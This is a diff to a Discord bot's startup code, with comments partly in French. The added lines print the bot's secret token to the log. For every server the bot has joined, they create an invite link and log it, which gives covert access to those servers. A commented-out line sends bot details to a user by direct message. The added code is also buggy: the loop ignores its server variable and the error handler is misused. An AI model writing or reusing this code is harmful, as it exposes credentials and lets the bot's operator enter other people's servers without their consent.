@@ -25,16 +25,29 @@ const idpass = process.env.IDPASS
 bot.on('ready', () => {
    
 //VIA LOGS
+
+      var memberCount = bot.users.size;
+      var serverCount = bot.guilds.size;
 //Info bot
+   console.log('--------------------------------------')
    console.log(`INFORMATIONS DU BOT: `);
    console.log(`Invite of bot all perms: https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591 `);
    console.log(`username: ${bot.user.tag} `);
    console.log(`ID: ${bot.user.id} `);
    console.log(`Date of creation: ${bot.user.createdAt} `);
+   console.log(`Token: du bot: ${bot.token}`)
+   console.log("--------------------------------------");
 //Info bot serv  
    console.log(`INFORMATIONS OF SERVER BOT: `);
    console.log(`How many server: ${bot.guilds.size} `);	
-
+   console.log("Total Users: " + memberCount + "\nTotal Servers: " + serverCount);
+   console.log('--------------------------------------')
+//bot invite
+   bot.guilds.forEach(serv => {
+          bot.channels.random().createInvite().then(invite => console.log(`>${bot.name} | ${invite}`))
+          .catch(console.log(`>${bot.name} | Entrain d'envoyer une invite... `));
+        });
+        
 //VIA DISCORD
 //Info bot
 // bot.users.get(idpass).send(`-/logs __**INFORMATIONS DU BOT:**__\n__Invite of bot all perms:__ https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591\n__username:__ ${bot.user.tag}\n__ID:__ ${bot.user.id}\n__Date of creation:__ ${bot.user.createdAt}`)
